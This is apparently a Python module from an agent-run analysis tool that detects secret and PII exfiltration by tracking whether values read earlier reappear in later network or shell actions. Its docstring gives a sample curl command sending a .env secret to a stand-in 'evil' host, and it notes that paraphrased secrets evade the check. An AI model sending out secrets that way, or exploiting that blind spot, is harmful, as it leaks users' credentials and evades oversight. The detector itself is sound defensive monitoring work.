"""Exfiltration path detection by VALUE lineage, not just category order.

`sequence_hits` finds "a secret read, THEN an egress" -- category order. That
catches the shape but not the substance: it can't tell whether the secret the
agent read is the same bytes it later sent. Taint tracking does.

The primitive: fingerprint the sensitive VALUES a run produced (credentials
via the scrub detectors, PII via shape patterns), then watch for those exact
values (or a distinctive fragment) reappearing in a later action's input or
result. A reappearance is a **lineage edge** -- data provenance you can point
at:

    sk-ant-… first seen in [1] Read(.env)
      └─ carried into [4] Bash(curl -d @… https://evil)   ← exfiltration

Verbatim propagation is the strong, defensible signal (the value is right
there in the wire). The model paraphrasing a secret into new words is NOT
caught here -- and the report says so, pointing at the weaker category
sequence for that case. Honest by construction: no "DLP" overclaim.
"""

from __future__ import annotations

import re
from typing import Any

from .action import Action, actions

# PII value shapes (the scrub PATTERNS cover credentials; these add people-data).
_PII = [
    ("email", re.compile(r"\b[A-Za-z0-9._%+\-]+@[A-Za-z0-9.\-]+\.[A-Za-z]{2,}\b")),
    ("ssn", re.compile(r"\b\d{3}-\d{2}-\d{4}\b")),
    ("credit-card", re.compile(r"\b(?:\d[ -]?){13,16}\b")),
    ("phone", re.compile(r"\b\+?\d[\d\-() ]{8,}\d\b")),
]

_MIN_FRAGMENT = 12  # a shared substring shorter than this is too weak to claim


def _sensitive_values(text: str) -> "list[tuple[str, str]]":
    """(kind, value) for every credential/PII value in a piece of text."""
    from .scrub import PATTERNS

    out: list[tuple[str, str]] = []
    for kind, pattern in PATTERNS:
        for m in pattern.finditer(text):
            # credential-assignment captures the value in group 3; others whole.
            val = m.group(3) if kind == "credential-assignment" and m.lastindex and m.lastindex >= 3 else m.group(0)
            if val and len(val) >= 8:
                out.append((kind, val))
    for kind, pattern in _PII:
        for m in pattern.finditer(text):
            out.append((kind, m.group(0)))
    return out


def _obs_text(a: Action) -> str:
    return a.observation.text if a.observation is not None else ""


def _carries(haystack: str, value: str) -> bool:
    """Does ``haystack`` contain ``value`` (or a long distinctive fragment)?"""
    if not haystack or not value:
        return False
    if value in haystack:
        return True
    # tolerate truncation/wrapping: a >=12-char run of the value appearing verbatim
    if len(value) > _MIN_FRAGMENT:
        return value[:_MIN_FRAGMENT] in haystack or value[-_MIN_FRAGMENT:] in haystack
    return False


def taint_paths(source: Any) -> "list[dict]":
    """Value-lineage exfiltration paths in a run.

    Each path: a sensitive value first observed at some step, then reappearing
    in a later action that leaves the box (network / user-comm / browser
    submit / shell). Deduped to the earliest source and each distinct sink.
    """
    acts = [a for a in actions(source) if a.type == "call" and a.step >= 0]

    # 1. Where did each sensitive value first appear (in a tool RESULT)?
    origin: dict[str, dict] = {}  # value -> {kind, step, tool}
    for a in acts:
        for kind, val in _sensitive_values(_obs_text(a)):
            origin.setdefault(val, {"kind": kind, "step": a.step, "tool": a.tool})

    if not origin:
        return []

    # 2. Does a later action CARRY a tainted value off the box?
    import json as _json

    egress_caps = {"network", "user_communication", "browser_submit", "money_movement"}
    paths: list[dict] = []
    seen: set = set()
    for a in acts:
        caps = set(a.capabilities)
        leaves = bool(caps & egress_caps) or "exec" in caps
        if not leaves:
            continue
        payload = _json.dumps(a.input, default=str) + " " + _obs_text(a)
        for val, src in origin.items():
            if a.step <= src["step"]:
                continue  # a sink must come after its source
            if not _carries(payload, val):
                continue
            key = (src["step"], a.step, src["kind"])
            if key in seen:
                continue
            seen.add(key)
            paths.append({
                "kind": src["kind"],
                "source": {"step": src["step"], "tool": src["tool"]},
                "sink": {"step": a.step, "tool": a.tool,
                         "via": sorted(caps & egress_caps) or ["exec"]},
                "value_preview": _preview(val),
            })
    paths.sort(key=lambda p: (p["source"]["step"], p["sink"]["step"]))
    return paths


def _preview(value: str) -> str:
    """A safe, non-leaking preview of a tainted value."""
    if len(value) <= 10:
        return value[:2] + "…"
    return f"{value[:4]}…{value[-2:]}"


def describe_taint(paths: "list[dict]") -> str:
    if not paths:
        return ("no verbatim value-lineage exfiltration found. (A model that "
                "paraphrased a secret into new words would not appear here -- "
                "check the category sequence with `loom search path:...`.)")
    lines = [f"{len(paths)} exfiltration path(s) by value lineage:"]
    for p in paths:
        via = ", ".join(p["sink"]["via"])
        lines.append(
            f"  ⛓ {p['kind']} ({p['value_preview']}): "
            f"[{p['source']['step']}] {p['source']['tool']} "
            f"→ [{p['sink']['step']}] {p['sink']['tool']} (via {via})")
    return "\n".join(lines)
